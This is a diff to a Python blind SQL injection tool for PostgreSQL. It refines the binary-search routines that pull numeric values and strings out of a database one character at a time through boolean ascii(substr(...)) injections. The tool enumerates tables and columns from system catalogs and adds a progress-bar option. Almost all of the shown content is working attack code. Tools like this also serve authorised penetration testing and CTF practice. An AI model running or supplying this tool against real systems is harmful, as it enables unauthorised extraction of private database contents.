@@ -6,6 +6,7 @@ to deduce the value of a string or number
 
 Currently only support PostgreSQL
 TODO: support for other DBMS
+TODO: threading for efficiency
 
 Author: Chester Pang <i@bopa.ng>
 '''
@@ -70,7 +71,7 @@ def determine_number(subquery, **kwargs):
         while inject("({}) < {}".format(subquery, left)):
             left *= 10
 
-    print_debug("Determined lower bound for", subquery, left)
+    # print_debug("Determined lower bound for", subquery, left)
 
     right = kwargs['right'] if 'right' in kwargs else None
     if not right:
@@ -79,24 +80,30 @@ def determine_number(subquery, **kwargs):
         while inject("({}) > {}".format(subquery, right)):
             right *= 10
 
-    print_debug("Determined upper bound for", subquery, right)
+    # print_debug("Determined upper bound for", subquery, right)
+
+    # sanity check
+    if not inject("({}) > 0 or ({}) <= 0".format(subquery, subquery)):
+        return 0
 
     # do binary search to find value for subquery
-    while left <= right:
+    while left < right:
         mid = int((left + right) / 2)
         if inject("({}) > {}".format(subquery, mid)):
             left = mid + 1
             print_debug("Found new lower bound:", left)
-        elif inject("({}) < {}".format(subquery, mid)):
-            right = mid - 1
-            print_debug("Found new upper bound:", right)
         else:
-            print_debug("Found value for {}: {}".format(subquery, mid))
-            return mid
+            right = mid
+            print_debug("Found new upper bound:", right)
 
-    raise Exception('Cannot determine value for query {}, '
-                    'result is between {} and {}'
-                    .format(subquery, left, right))
+    if inject("({})<>{}".format(subquery, left)):
+        raise Exception('Cannot determine value for query {}, '
+                        'result is between {} and {}'
+                        .format(subquery, left, right))
+
+    print_debug("Found value for {}: {}".format(subquery, left))
+    return left
+
 
 
 '''
@@ -134,7 +141,7 @@ def determine_records(subquery, **kwargs):
     for i in pbar:
         res.append(determine_string("{} LIMIT 1 OFFSET {}"
                                     .format(subquery, i),
-                                    args.verbose))
+                                    not args.no_individual_pbar))
         if not args.silent:
             pbar.write("Determined record: " + res[-1])
     return res
@@ -161,13 +168,13 @@ def determine_string(subquery, pbar_enabled=True):
         # binary search for matching char in char_range
         left = 0
         right = len(char_range) - 1
-        while left <= right:
+        while left < right:
             mid = int((left + right) / 2)
             if inject("ascii(substr(({}),{},1))>{}"
                       .format(subquery, i+1, char_range[mid])):
                 left = mid + 1
             else:
-                right = mid - 1
+                right = mid
 
         if left >= len(char_range) or \
                 not inject("ascii(substr(({}),{},1))={}"
@@ -265,6 +272,9 @@ def inject_func(payload, args):
                         help='Use all printable chars to fuzz string')
     parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                         help='Verbose mode, print debug info')
+    parser.add_argument('-P', '--diable-individual-record-progress', 
+                        action='store_true', dest='no_individual_pbar',
+                        help='Disable individual progress bar for each record')
     parser.add_argument('-V', '--do-not-verify-sqli', action='store_true',
                         dest='no_verify',
                         help='Skip verification of given sqli')
@@ -289,7 +299,7 @@ def inject_func(payload, args):
 
     if not args.no_verify:
         if not verify_inject():
-            print('sqli verification failed, check your inject_func')
+            print('sqli verification failed, check your inject.py')
             exit()
         else:
             print_debug('sqli injection seems to be working')
@@ -308,7 +318,7 @@ def inject_func(payload, args):
     elif args.type == 'columns':
         print(determine_records("SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND relname='" + args.query + "'"))
 
-    print(total_injection, "injections performed")
+    print_info(total_injection, "injections performed")
 
 if __name__ == '__main__':
     main()
